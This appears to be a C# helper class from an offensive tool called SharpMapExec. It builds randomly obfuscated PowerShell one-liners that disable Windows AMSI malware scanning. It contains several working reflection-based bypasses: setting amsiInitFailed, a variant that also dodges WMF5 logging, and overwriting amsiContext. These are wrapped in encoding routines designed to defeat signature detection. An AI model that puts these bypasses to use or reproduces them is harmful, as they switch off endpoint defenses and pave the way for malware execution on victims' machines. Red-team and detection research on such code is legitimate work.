using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;


namespace SharpMapExec.Helpers
{
    class AmsiFail
    {
        private static Random random = new Random();

        public static int RandomNumber(int min, int max)
        {
            return random.Next(min, max);
        }
        public static string ObfuCharBute(char charin)
        {

            int asciiInt = Convert.ToInt32(charin);
            var asciiByte = Convert.ToByte(asciiInt).ToString("X");
            return "[" + RandomCase("CHAR") + "][" + RandomCase("BYTE") + "]0x" + asciiByte;
        }
        public static string RandomCase(string input)
        {
            return new string((input.Select(x => random.Next() % 2 == 0 ? (char.IsUpper(x) ? x.ToString().ToLower().First() : x.ToString().ToUpper().First()) : x)).ToArray());
        }


        public static string ByteEncode(char inputChar)
        {
            //Get the ascii value of the char
            int asciiValue = Convert.ToInt32(inputChar);

            return $"([{RandomCase("byte")}]0x{Convert.ToByte(asciiValue).ToString("X")})";
        }

        public static string DiacriticEncode(string inputChar)
        {
            string charBuilder = "";
            foreach (var _char in inputChar)
            {
                charBuilder += GetRandomDiacritic(Convert.ToInt32(_char));
            }
            return charBuilder;

        }

        private static string GetRandomDiacritic(int asciiValue)
        {
            switch (asciiValue)
            {
                case 65:   //A
                    return Convert.ToChar(RandomNumber(192, 197)).ToString();
                case 97:  //a
                    return Convert.ToChar(RandomNumber(224, 229)).ToString();
                case 73:  //I
                    return Convert.ToChar(RandomNumber(204, 207)).ToString();
                case 105:  //i
                    return Convert.ToChar(RandomNumber(236, 239)).ToString();
                case 79:  //O
                    return Convert.ToChar(RandomNumber(210, 216)).ToString();
                case 69: //E
                    return Convert.ToChar(RandomNumber(236, 239)).ToString();
                case 111: //o
                    return Convert.ToChar(RandomNumber(243, 246)).ToString();
                default:
                    return Convert.ToChar(asciiValue).ToString();
            }


        }

        public static string HTMLEncode(string inputChar)
        {
            var charBuilder = "";
            foreach (var _char in inputChar)
            {
                charBuilder += $"&#" + Convert.ToInt32(_char) + ";";
            }
            return charBuilder;

        }

        public static string CharEncode(char inputChar)
        {
            //Get the ascii value of the char
            int asciiValue = Convert.ToInt32(inputChar);

            //Obfuscate the int value
            return ObfuscateInt(asciiValue).ToString();

        }

        public static string ObfuscateChar(char charInput)
        {

            //Select a random encoding method for a single char
            switch (RandomNumber(1, 3))
            {
                case 1:
                    return "+[" + RandomCase("CHAR") + "]" + ByteEncode(charInput);
                case 2:
                    return "+[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
                default:
                    return "+[" + RandomCase("CHAR") + "]" + CharEncode(charInput);
            }

        }

        public static string ObfuscateInt(int asciiInt)
        {
            var subNumber = RandomNumber(asciiInt - asciiInt + 1, (asciiInt - 2));

            switch (RandomNumber(1, 5))
            {
                case 1:
                    return $"({subNumber}+{asciiInt - subNumber})";
                case 2:
                    return $"({asciiInt + subNumber}-{subNumber})";
                case 3:
                    return $"({asciiInt * subNumber}/{subNumber})";
                case 4:
                    return $"({asciiInt})";
                default:
                    return $"({asciiInt * subNumber}/{subNumber})";
            }
        }

        public static string ObfuscateString(string data)
        {
            string obfuscatedString = "";
            switch (RandomNumber(1, 3))
            {
                case 1:
                    foreach (char _char in data)
                    {
                        obfuscatedString += ObfuscateChar(_char);
                    }
                    return obfuscatedString;
                case 2:
                    //Obfuscate the whole string as HTML
                    return "+[" + RandomCase("System.Net.WebUtility") + "]::" + RandomCase("HtmlDecode") + "('" + HTMLEncode(data) + "')";
                case 3:
                    //This part is not rdy yet :/
                    return $"+'{DiacriticEncode(data)}'." + @"Normalize('FormD') -replace '\p{Mn}'";
                default:
                    return "";
            }
        }

        public static string RandomString(int size, bool lowerCase = false)
        {
            var builder = new StringBuilder(size);
            char offset = lowerCase ? 'a' : 'A';
            const int lettersOffset = 26;

            for (var i = 0; i < size; i++)
            {
                var @char = (char)random.Next(offset, offset + lettersOffset);
                builder.Append(@char);
            }
            return lowerCase ? builder.ToString().ToLower() : builder.ToString();
        }

        public static string encodePayload(string examplePayloads, bool doubleQutes = false)
        {
            //Regex to pull out all strings inside '*' tags
            Regex rgStringRule = new Regex(@"\'(.*?)\'", RegexOptions.Compiled | RegexOptions.IgnoreCase);

            //Pull all all results that are not empty
            List<string> matchedStrings = rgStringRule.Matches(examplePayloads).Cast<Match>().Where(x => !string.IsNullOrEmpty(x.Value)).Select(x => x.Value).ToList();

            //if there is any results
            if (matchedStrings.Count() > 0)
            {
                //Pick ONE of them at random
                string randomString = matchedStrings[RandomNumber(0, matchedStrings.Count())];

                //Obfuscate the whole string
                string randomObfuscatedString = ObfuscateString(randomString.Replace("'", "")).TrimStart('+');

                //Replace
                examplePayloads = examplePayloads.Replace(randomString, "$(" + randomObfuscatedString + ")");
            }


            //Will add more key words here
            var mustEncode = new string[] { "Amsi", "amsi" };

            foreach (var word in mustEncode)
            {
                string obfuscatedString = ObfuscateString(word);

                if (doubleQutes)
                    obfuscatedString = "$(" + obfuscatedString.TrimStart('+') + ")";
                else
                    obfuscatedString = "'+$(" + obfuscatedString.TrimStart('+') + ")+'";

                examplePayloads = examplePayloads.Replace(word, obfuscatedString);
            }

            return examplePayloads;

        }
        public static string GetPayload()
        {
            //Unknown -Force error
            var memVar = RandomString(RandomNumber(3, 10));
            //var ForceErrer = "$" + memVar + "=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(" + ObfuscateInt(9076) + ");[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$" + memVar + ");";

            // Using Matt Graebers Reflection method
            var MattGRefl = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);";

            //Using Matt Graebers Reflection method with WMF5 autologging bypass
            var MattGReflLog = "[Delegate]::CreateDelegate((\"Func``3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetField')).Invoke('amsiInitFailed',(('NonPublic,Static') -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);";

            //Using Matt Graebers second Reflection method
            var MattGref02 = "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x" + random.Next(0, int.MaxValue).ToString("X") + ");";

            //Select a random method
            switch (RandomNumber(1, 3))
            {
                case 1:
                    return encodePayload(MattGRefl);
                case 2:
                    return encodePayload(MattGReflLog);
                case 3:
                    return encodePayload(MattGref02);
                //case 4:
                //    return encodePayload(ForceErrer, true);
                default:
                    return encodePayload(MattGRefl);
            }
        }
    }
}
